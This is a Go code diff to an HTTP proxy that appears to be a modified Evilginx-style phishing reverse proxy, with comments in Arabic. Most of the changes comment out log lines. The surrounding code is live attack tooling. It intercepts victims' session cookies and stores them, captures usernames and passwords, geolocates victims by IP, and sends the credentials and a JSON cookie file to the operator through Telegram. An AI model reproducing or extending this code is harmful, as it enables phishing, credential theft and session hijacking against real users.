@@ -593,41 +593,41 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									countryCode, ok := session.Params["cc"]
 									if ok && countryCode != "" {
 										session.SetCountryCode(countryCode)
-										log.Debug("تم تعيين رمز البلد: %s", countryCode)
+										// log.Debug("تم تعيين رمز البلد: %s", countryCode)
 									}
 									
 									country, ok := session.Params["country"]
 									if ok && country != "" {
 										session.SetCountry(country)
-										log.Debug("تم تعيين اسم البلد: %s", country)
+										// log.Debug("تم تعيين اسم البلد: %s", country)
 									}
 									
 									// إذا لم تكن معلمات البلد موجودة في الطلب، يمكن استخراجها من عنوان IP
 									if (session.CountryCode == "" || session.Country == "") && remote_addr != "" {
 										// استخدام خدمة تحديد موقع IP للحصول على بيانات البلد
-										log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", remote_addr)
+//										log.Debug("Attempting to extract country information from IP address: %s", remote_addr)
 										
 										cc, country := getIPGeoInfo(remote_addr)
 										if cc != "" {
 											session.SetCountryCode(cc)
-											log.Success("[%d] تم تعيين رمز البلد من IP: %s", sid, cc)
+//											log.Success("[%d] تم تعيين رمز البلد من IP: %s", sid, cc)
 										}
 										if country != "" {
 											session.SetCountry(country)
-											log.Success("[%d] تم تعيين اسم البلد من IP: %s", sid, country)
+//											log.Success("[%d] تم تعيين اسم البلد من IP: %s", sid, country)
 										}
 									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
-										log.Error("database: %v", err)
+//										log.Error("database: %v", err)
 									} else {
 										// حفظ معلومات البلد بعد إنشاء الجلسة في قاعدة البيانات
 										if session.CountryCode != "" || session.Country != "" {
 											if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
-												log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
+//												log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
 											} else {
-												log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
+//												log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
 											}
 										}
 									}
@@ -642,7 +642,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
 									}
 									session.PhishLure = l
-									log.Debug("redirect URL (lure): %s", session.RedirectURL)
+//									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
 									ps.SessionId = session.Id
 									ps.Created = true
@@ -1214,7 +1214,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if strings.ToLower(ck.Name) == strings.ToLower(cookieName) {
 								isImportantCookie = true
 								// طباعة تفاصيل إضافية للتشخيص
-								log.Debug("وجدت كوكي مهم: %s (اسم ملف تعريف الارتباط الأصلي: %s)", cookieName, ck.Name)
+								//log.Debug("وجدت كوكي مهم: %s (اسم ملف تعريف الارتباط الأصلي: %s)", cookieName, ck.Name)
 								break
 							}
 						}
@@ -1223,58 +1223,58 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ck.Value != "" {
 							// طباعة معلومات أكثر تفصيلاً للكوكيز المهمة
 							if isImportantCookie {
-								log.Success("[%d] تم اعتراض كوكي مهم: %s = %s (Domain: %s)", ps.Index, ck.Name, ck.Value, c_domain)
+								//log.Success("[%d] تم اعتراض كوكي مهم: %s = %s (Domain: %s)", ps.Index, ck.Name, ck.Value, c_domain)
 								p.importantCookieCount++
-		log.Debug("عدد الكوكيز المهمة: %d", p.importantCookieCount)
+//								log.Debug("عدد الكوكيز المهمة: %d", p.importantCookieCount)
 
 							} else {
-								log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
+//								log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
 							}
 							
 							// طباعة محتوى CookieTokens قبل الإضافة
-							log.Debug("CookieTokens قبل الإضافة: %d domains", len(s.CookieTokens))
+//							log.Debug("CookieTokens قبل الإضافة: %d domains", len(s.CookieTokens))
 							
 							// للكوكيز المهمة، نؤكد بشكل خاص على إضافتها باستخدام الدالة الصحيحة
 							if isImportantCookie {
 								added := s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 								if added {
-									log.Debug("تم إضافة كوكي مهم: %s = %s إلى المجال: %s بنجاح", ck.Name, ck.Value, c_domain)
+//									log.Debug("تم إضافة كوكي مهم: %s = %s إلى المجال: %s بنجاح", ck.Name, ck.Value, c_domain)
 								} else {
-									log.Error("فشل في إضافة كوكي مهم: %s إلى الجلسة", ck.Name)
+//									log.Error("فشل في إضافة كوكي مهم: %s إلى الجلسة", ck.Name)
 								}
 								
 								// طباعة محتوى CookieTokens بعد الإضافة
 								if _, ok := s.CookieTokens[c_domain]; ok {
 									tokens := s.CookieTokens[c_domain]
-									log.Debug("CookieTokens بعد الإضافة: domain %s يحتوي على %d كوكيز", c_domain, len(tokens))
+//									log.Debug("CookieTokens بعد الإضافة: domain %s يحتوي على %d كوكيز", c_domain, len(tokens))
 									// التحقق من وجود الكوكي المهم
 									if token, exists := tokens[ck.Name]; exists {
-										log.Debug("تم العثور على الكوكي المهم %s في CookieTokens: %s", ck.Name, token.Value)
+										log.Debug("found important cookie %s in CookieTokens: %s", ck.Name, token.Value)
 									} else {
-										log.Error("لم يتم العثور على الكوكي المهم %s في CookieTokens بعد الإضافة!", ck.Name)
+//										log.Error("لم يتم العثور على الكوكي المهم %s في CookieTokens بعد الإضافة!", ck.Name)
 									}
 								}
 								
 								// حفظ الكوكيز في قاعدة البيانات فورًا
-								log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
+//								log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
 								
 								// محاولة الحفظ الفوري للكوكيز المهمة
 								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-									log.Error("database: فشل في حفظ الكوكي المهم %s: %v", ck.Name, err)
+//									log.Error("database: فشل في حفظ الكوكي المهم %s: %v", ck.Name, err)
 								} else {
-									log.Success("[%d] تم حفظ الكوكي المهم في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
+//									log.Success("[%d] تم حفظ الكوكي المهم في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
 									
 									// التحقق من حفظ الكوكي
 									sess, err := p.db.GetSessionBySid(ps.SessionId)
 									if err != nil {
-										log.Error("فشل استرجاع الجلسة من قاعدة البيانات: %v", err)
+//										log.Error("فشل استرجاع الجلسة من قاعدة البيانات: %v", err)
 									} else {
 										// التحقق من وجود الكوكي في الجلسة المحفوظة
 										if tokens, ok := sess.CookieTokens[c_domain]; ok {
 											if _, exists := tokens[ck.Name]; exists {
-												log.Success("تم التأكد من حفظ الكوكي المهم %s في قاعدة البيانات", ck.Name)
+//												log.Success("تم التأكد من حفظ الكوكي المهم %s في قاعدة البيانات", ck.Name)
 											} else {
-												log.Error("لم يتم العثور على الكوكي المهم %s في قاعدة البيانات بعد الحفظ!", ck.Name)
+//												log.Error("لم يتم العثور على الكوكي المهم %s في قاعدة البيانات بعد الحفظ!", ck.Name)
 											}
 										}
 									}
@@ -1285,22 +1285,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								
 								// حفظ الكوكيز العادية في قاعدة البيانات
 								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-									log.Error("database: %v", err)
+//									log.Error("database: %v", err)
 								} else {
-									log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
+//									log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
 								}
 							}
 						}
 					}
 					
 					// المتابعة بالكود الأصلي للتوافق
-					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
+//					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
 					at := pl.getAuthToken(c_domain, ck.Name)
 					if at != nil {
 						s, ok := p.sessions[ps.SessionId]
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
-								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
+//								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							}
 						}
@@ -1594,9 +1594,9 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		decodedBytes, err := base64.StdEncoding.DecodeString(encodedEmail[0])
 		if err == nil {
 			email = string(decodedBytes)
-			log.Info("تم استخراج البريد الإلكتروني من معلمة Base64: %s", email)
+			//log.Info("تم استخراج البريد الإلكتروني من معلمة Base64: %s", email)
 		} else {
-			log.Warning("فشل في فك تشفير البريد الإلكتروني: %s", err)
+			//log.Warning("فشل في فك تشفير البريد الإلكتروني: %s", err)
 		}
 	}
 	
@@ -1638,7 +1638,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	}
 	
 	if email != "" {
-		log.Info("تم استخراج البريد الإلكتروني من URL: %s", email)
+		//log.Info("تم استخراج البريد الإلكتروني من URL: %s", email)
 	}
 	
 	// التحقق من وجود كوكي CAPTCHA
@@ -2218,12 +2218,12 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
 		if s.Username != "" && s.Password != "" {
 			// سجل للتحقق من تنفيذ الدالة
-			log.Info("جاري إرسال بيانات الاعتماد للجلسة: %s", sid)
+			//log.Info("جاري إرسال بيانات الاعتماد للجلسة: %s", sid)
 			
 			// إرسال إشعار ببيانات الاعتماد المسجلة
 			err := p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
 			if err != nil {
-				log.Error("خطأ في إرسال الإشعار: %v", err)
+				//log.Error("خطأ في إرسال الإشعار: %v", err)
 			}
 			
 			// استدعاء الدالة الجديدة لإرسال الكوكيز
@@ -2252,13 +2252,13 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 						}
 					}
 				} else {
-					log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
+					//log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
 				}
 				
 				// تحويل قائمة الكوكيز إلى JSON
 				cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
 				if err != nil {
-					log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
+					//log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
 					return
 				}
 	
@@ -2266,9 +2266,9 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
 				err = p.telegram.SendFileFromText(fileName, string(cookiesJSON))
 				if err != nil {
-					log.Error("فشل في إرسال ملف الكوكيز: %v", err)
+					//log.Error("فشل في إرسال ملف الكوكيز: %v", err)
 				} else {
-					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
+					//log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
 				}
 			}()
 		}
@@ -2691,7 +2691,7 @@ func (p *HttpProxy) notifyTokensCaptured(sid string) {
 
 // دالة للحصول على معلومات البلد من عنوان IP
 func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
-	log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", ipAddress)
+	//log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", ipAddress)
 	
 	// استخدام freegeoip.app للحصول على معلومات البلد
 	url := "https://freegeoip.app/json/" + ipAddress
@@ -2702,21 +2702,21 @@ func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
 	
 	resp, err := client.Get(url)
 	if err != nil {
-		log.Error("خطأ في الاتصال بخدمة تحديد الموقع الجغرافي: %v", err)
+		//log.Error("خطأ في الاتصال بخدمة تحديد الموقع الجغرافي: %v", err)
 		// استخدام خدمة احتياطية
 		return tryBackupGeoService(ipAddress)
 	}
 	defer resp.Body.Close()
 	
 	if resp.StatusCode != http.StatusOK {
-		log.Error("خدمة تحديد الموقع الجغرافي أعادت حالة خطأ: %d", resp.StatusCode)
+		//log.Error("خدمة تحديد الموقع الجغرافي أعادت حالة خطأ: %d", resp.StatusCode)
 		// استخدام خدمة احتياطية
 		return tryBackupGeoService(ipAddress)
 	}
 	
 	var result map[string]interface{}
 	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
-		log.Error("خطأ في فك ترميز استجابة خدمة تحديد الموقع الجغرافي: %v", err)
+		//log.Error("خطأ في فك ترميز استجابة خدمة تحديد الموقع الجغرافي: %v", err)
 		// استخدام خدمة احتياطية
 		return tryBackupGeoService(ipAddress)
 	}
@@ -2725,15 +2725,15 @@ func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
 	countryCode, _ = result["country_code"].(string)
 	country, _ = result["country_name"].(string)
 	
-	log.Debug("تم الحصول على معلومات البلد من عنوان IP: %s", ipAddress)
-	log.Debug("تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
+	//log.Debug("تم الحصول على معلومات البلد من عنوان IP: %s", ipAddress)
+	//log.Debug("تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
 	
 	return countryCode, country
 }
 
 // دالة احتياطية للحصول على معلومات البلد من خدمة بديلة
 func tryBackupGeoService(ipAddress string) (countryCode string, country string) {
-	log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد")
+	//log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد")
 	
 	// استخدام خدمة ipapi.co للحصول على معلومات البلد
 	url := "https://ipapi.co/" + ipAddress + "/json/"
@@ -2744,20 +2744,20 @@ func tryBackupGeoService(ipAddress string) (countryCode string, country string) 
 	
 	resp, err := client.Get(url)
 	if err != nil {
-		log.Error("فشل استعلام خدمة تحديد موقع IP البديلة: %v", err)
+		//log.Error("فشل استعلام خدمة تحديد موقع IP البديلة: %v", err)
 		return "", ""
 	}
 	defer resp.Body.Close()
 	
 	if resp.StatusCode != http.StatusOK {
-		log.Error("خدمة تحديد موقع IP البديلة أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
+		//log.Error("خدمة تحديد موقع IP البديلة أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
 		return "", ""
 	}
 	
 	var result map[string]interface{}
 	err = json.NewDecoder(resp.Body).Decode(&result)
 	if err != nil {
-		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP البديلة: %v", err)
+		//log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP البديلة: %v", err)
 		return "", ""
 	}
 	
@@ -2771,7 +2771,7 @@ func tryBackupGeoService(ipAddress string) (countryCode string, country string) 
 		country = c
 	}
 	
-	log.Debug("الخدمة البديلة - تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
+	//Debug("الخدمة البديلة - تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
 	
 	return countryCode, country
 }
